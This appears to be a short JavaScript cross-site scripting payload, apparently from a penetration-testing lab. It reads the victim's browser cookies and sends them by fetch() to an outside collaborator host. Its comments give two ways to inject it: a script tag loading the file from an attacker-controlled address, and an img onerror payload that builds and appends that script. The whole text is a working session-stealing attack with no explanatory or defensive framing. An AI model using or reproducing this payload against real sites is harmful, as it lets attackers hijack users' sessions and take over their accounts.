let cookie=document.cookie
let encodedCookie=encodeURIComponent(cookie)
fetch ("http://fcv7ef1el1bkfhf2nwxz2v3srjxal19q.oastify.com/exfil?data=" + encodedCookie)
//thisworks with <script src="http://192.168.45.233/xssstealcookie.js" ></script>
//or
//<img src/onerror=s=document.createElement('script');s.src='http://192.168.45.233/xssstealcookies.js';document.body.appendChild(s)>
